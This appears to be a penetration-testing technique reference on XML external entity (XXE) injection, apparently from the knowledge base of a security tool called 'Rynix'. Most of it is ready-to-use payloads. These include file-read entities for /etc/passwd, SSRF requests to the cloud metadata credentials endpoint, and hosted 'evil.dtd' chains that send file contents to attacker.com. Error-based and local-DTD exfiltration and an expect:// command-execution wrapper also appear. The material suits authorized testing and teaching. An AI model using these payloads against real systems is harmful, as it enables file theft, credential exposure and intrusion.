---
id: PS-XXE
category: XML external entity (XXE) injection
lab_count: 9
wstg_refs: [WSTG-INPV-07]
---

# XXE Injection: Attack Technique Reference

XML External Entity (XXE) injection exploits vulnerable XML parsers that process external entity definitions. The attacker defines an external entity in the XML document's DOCTYPE that references a local file, internal URL, or attacker-controlled server. When the parser resolves the entity, it fetches the resource and includes its content, enabling file read, SSRF, and in some cases remote code execution.

---

## 1. Detection

### 1A. Identify XML Processing Points

Look for endpoints and features that accept or process XML:

- **Content-Type headers:** `application/xml`, `text/xml`, `application/soap+xml`
- **POST bodies with XML structure:** Any request body starting with `<?xml` or containing angle-bracket markup
- **SOAP endpoints:** WSDL-described services using XML envelopes
- **File uploads:** SVG, DOCX, XLSX, PPTX, XML, RSS feeds (all contain XML internally)
- **API endpoints:** Some REST APIs accept XML even when documented for JSON
- **Configuration endpoints:** XML-based config imports

### 1B. Content-Type Manipulation

Some endpoints that normally accept form data or JSON will also process XML if you change the Content-Type header:

```
# Original request
POST /api/check HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1

# Modified to XML
POST /api/check HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

### 1C. Basic Detection Test

Inject a simple internal entity to verify the parser processes DTD definitions:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe "XXEDETECTED">]>
<data>&xxe;</data>
```

If the response contains `XXEDETECTED`, the parser processes entities and XXE is likely exploitable.

### 1D. Out-of-Band Detection

When no entity content is reflected in the response, use an external entity to trigger a callback:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe-test">]>
<data>&xxe;</data>
```

If you receive an HTTP request at `attacker.com`, the parser fetches external resources.

---

## 2. Techniques

### 2A. Classic File Retrieval

Define an external entity that reads a local file using the `file://` protocol. The file contents are substituted where the entity is referenced.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**Variations:**
```xml
<!-- Absolute path -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">

<!-- Relative path (relative to working directory) -->
<!ENTITY xxe SYSTEM "file:///../../../etc/passwd">

<!-- PHP filter (base64 encode to avoid XML parsing issues with binary/special chars) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

**Common issue:** If the file contains characters that break XML parsing (e.g., `<`, `&`), the entity substitution will fail. Use the CDATA trick or base64 encoding (see Section 2D for error-based exfiltration as an alternative).

> Lab refs: PS-XXE-01

### 2B. SSRF via XXE

External entities can fetch URLs, turning XXE into SSRF. The server makes HTTP requests to internal systems on the attacker's behalf.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**Internal network targets:**
```xml
<!-- AWS metadata -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- Internal admin panel -->
<!ENTITY xxe SYSTEM "http://127.0.0.1/admin">

<!-- Internal service -->
<!ENTITY xxe SYSTEM "http://192.168.0.1:8080/api/status">

<!-- Port scanning -->
<!ENTITY xxe SYSTEM "http://192.168.0.1:22">
```

> Lab refs: PS-XXE-02

### 2C. Blind XXE: Out-of-Band Interaction

When entity values are not reflected in responses, confirm XXE by triggering an out-of-band interaction.

**Using regular entities:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://OOB-CALLBACK.example">]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**Using XML parameter entities (when regular entities are blocked):**

Parameter entities are declared with `%` and can only be used within the DTD, not in the document body. Some parsers block regular external entities but allow parameter entities.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://OOB-CALLBACK.example"> %xxe;]>
<stockCheck><productId>1</productId></stockCheck>
```

> Lab refs: PS-XXE-03, PS-XXE-04

### 2D. Blind XXE: Data Exfiltration via External DTD

Exfiltrate file contents through an HTTP request to an attacker-controlled server. This requires hosting a malicious DTD file.

**Step 1: Host a malicious DTD on your server (`http://attacker.com/evil.dtd`):**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Step 2: Submit the XXE payload that loads the external DTD:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<stockCheck><productId>1</productId></stockCheck>
```

**How it works:**
1. The parser loads `evil.dtd` from the attacker's server
2. `%file` reads `/etc/passwd` into a parameter entity
3. `%eval` dynamically constructs a new entity that includes the file contents in a URL
4. `%exfil` triggers an HTTP request to the attacker's server with the file contents as a query parameter
5. The attacker reads the file contents from their access logs

**Limitation:** This does not work if the file contains characters that are invalid in URLs or XML (e.g., newlines, `<`, `&`). For files with special characters, use error-based exfiltration (Section 2E) or the PHP base64 filter.

> Lab refs: PS-XXE-05

### 2E. Blind XXE: Error-Based Exfiltration

Trigger an XML parsing error that includes the contents of a target file in the error message. This works even when out-of-band connections are blocked.

**Step 1: Host a malicious DTD (`http://attacker.com/error.dtd`):**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Step 2: Submit the payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/error.dtd"> %xxe;]>
<stockCheck><productId>1</productId></stockCheck>
```

**How it works:**
1. `%file` reads the target file into a parameter entity
2. `%eval` constructs a new entity that references a nonexistent file path containing the file contents
3. `%error` triggers an error because the file path does not exist
4. The error message includes the constructed path, which contains the target file's contents

**Example error output:**
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

> Lab refs: PS-XXE-06

### 2F. XInclude Injection

When you cannot control the entire XML document (e.g., your input is placed into a server-constructed XML document), use XInclude to include external files from within a data value.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**In a form parameter context:**
```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

**Key advantage:** XInclude does not require a DOCTYPE declaration. This makes it effective when the application constructs the XML document around your input, and you cannot inject a DOCTYPE.

> Lab refs: PS-XXE-07

### 2G. XXE via File Upload

Many file formats are XML-based internally. Uploading a crafted file can trigger XXE processing.

**SVG file with XXE:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**DOCX file manipulation:**
1. Create a normal `.docx` file
2. Unzip it (DOCX is a ZIP of XML files)
3. Edit `word/document.xml` or `[Content_Types].xml` to inject the XXE payload
4. Re-zip and upload

**XLSX file manipulation:**
1. Create a normal `.xlsx` file
2. Unzip it
3. Edit `xl/sharedStrings.xml` or `xl/worksheets/sheet1.xml` to inject XXE
4. Re-zip and upload

**Other XML-based formats:**
- PDF (some generators use XML internally)
- RSS/Atom feeds
- XHTML documents
- SAML responses
- SOAP messages

> Lab refs: PS-XXE-08

### 2H. Local DTD Repurposing

When out-of-band connections are completely blocked (no HTTP, no DNS), use a local DTD file already on the server to trigger error-based exfiltration.

**Step 1: Discover a local DTD file:**
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local_dtd;
]>
```

If this does not throw a "file not found" error, the DTD exists.

**Step 2: Find a parameterized entity within the DTD that can be redefined:**

Examine the DTD source (or guess common entity names) and redefine an entity to include the error-based exfiltration payload.

**Step 3: Exploit by redefining the entity:**
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<stockCheck><productId>1</productId></stockCheck>
```

**How it works:**
1. The parser loads the local DTD file
2. Your redefined entity (`ISOamso` in this case) overrides the one in the DTD
3. When the DTD processes the entity, it executes the error-based exfiltration chain
4. The file contents appear in the error message

**Common local DTD files to try:**

| OS / Distribution | DTD Path |
|-------------------|----------|
| GNOME systems | `/usr/share/yelp/dtd/docbookx.dtd` |
| Debian/Ubuntu | `/usr/share/xml/fontconfig/fonts.dtd` |
| Red Hat/CentOS | `/usr/share/sgml/docbook/xml-dtd-4.*/docbookx.dtd` |
| Alpine Linux | `/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd` |
| Java (any OS) | `/usr/share/java/jsp-api-2.3.jar!/javax/servlet/jsp/resources/jspxml.dtd` |
| Windows IIS | `C:\windows\system32\wbem\xml\cim20.dtd` |
| macOS | `/usr/local/share/xml/docbook/4.5/docbookx.dtd` |

> Lab refs: PS-XXE-09

---

## 3. Protocol Handlers

The protocols available for external entity resolution vary by XML parser and platform:

| Protocol | Java | .NET | PHP | Ruby | Python |
|----------|------|------|-----|------|--------|
| `file://` | Yes | Yes | Yes | Yes | Yes |
| `http://` | Yes | Yes | Yes | Yes | Yes |
| `https://` | Yes | Yes | Yes | Yes | Yes |
| `ftp://` | Yes | Yes | Yes | - | - |
| `jar://` | Yes | - | - | - | - |
| `php://` | - | - | Yes | - | - |
| `phar://` | - | - | Yes | - | - |
| `expect://` | - | - | Yes* | - | - |
| `gopher://` | Yes** | - | Yes* | - | - |
| `data://` | - | - | Yes | - | - |
| `netdoc://` | Yes | - | - | - | - |

\* Requires specific extensions to be installed
\** Available in some Java versions

**PHP-specific techniques:**
```xml
<!-- Base64 encode to handle special characters -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

<!-- Expect wrapper for RCE (if expect extension installed) -->
<!ENTITY xxe SYSTEM "expect://id">
```

**Java-specific techniques:**
```xml
<!-- Read JAR contents -->
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/path/to/file">

<!-- Netdoc protocol -->
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
```

---

## 4. XXE Payload Templates

### 4A. File Read (Classic)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

### 4B. SSRF (Internal Access)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/admin">]>
<root><data>&xxe;</data></root>
```

### 4C. Blind OOB Detection (Regular Entity)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]>
<root><data>&xxe;</data></root>
```

### 4D. Blind OOB Detection (Parameter Entity)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR.net"> %xxe;]>
<root><data>1</data></root>
```

### 4E. Blind Data Exfiltration (External DTD)

**Hosted DTD (`evil.dtd`):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<root><data>1</data></root>
```

### 4F. Error-Based Exfiltration (External DTD)

**Hosted DTD (`error.dtd`):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/error.dtd"> %xxe;]>
<root><data>1</data></root>
```

### 4G. Error-Based Exfiltration (Local DTD)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<root><data>1</data></root>
```

### 4H. XInclude (No DOCTYPE Control)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### 4I. SVG Upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

---

## 5. Quick Reference: XXE Decision Tree

```
Can you control the full XML document?
├── YES
│   ├── Is entity content reflected in response?
│   │   ├── YES → Use Classic File Retrieval (2A) or SSRF (2B)
│   │   └── NO (blind)
│   │       ├── Can you make outbound HTTP/DNS?
│   │       │   ├── YES → Use OOB Exfiltration via External DTD (2D)
│   │       │   └── NO
│   │       │       ├── Are XML errors shown?
│   │       │       │   ├── YES → Use Error-Based Exfiltration (2E or 2H)
│   │       │       │   └── NO → Limited to boolean-based file existence checks
│   │       │       └── Try Local DTD Repurposing (2H) for error-based
│   │       └── Regular entities blocked? Try Parameter Entities (2C)
│   └── Does the parser process DOCTYPE? Test with internal entity first
└── NO (input placed into existing XML)
    ├── Can you inject arbitrary XML tags?
    │   ├── YES → Use XInclude (2F)
    │   └── NO → Not exploitable via XXE
    └── Is it a file upload accepting XML-based formats?
        └── YES → Use SVG/DOCX XXE (2G)
```
## Rynix workflow

1. `get_technique_guide` for `xxe` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `record_finding`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `record_finding`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

